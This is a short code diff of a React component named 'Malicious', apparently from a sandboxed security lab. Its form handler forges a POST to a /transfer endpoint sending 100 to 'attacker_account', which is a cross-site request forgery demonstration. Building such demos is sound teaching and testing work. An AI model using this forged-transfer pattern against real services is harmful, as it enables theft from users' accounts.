@@ -1,13 +1,14 @@
-import React from 'react';
 import axios from 'axios';
+import React from 'react';
 
-const serverUrl = process.env.SANDBOX_URL;
+const serverUrl = document.location.host.replace("3000", "3001");
+console.log("serverUrl:", serverUrl);
 function Malicious() {
   const handleSubmit = async (e) => {
     e.preventDefault();
-    await axios.post(`http://${serverUrl}/transfer`, {
+    await axios.post(`https://${serverUrl}/transfer`, {
       amount: 100,
-      toAccount: 'attacker_account_number'
+      toAccount: 'attacker_account'
     });
   };
 
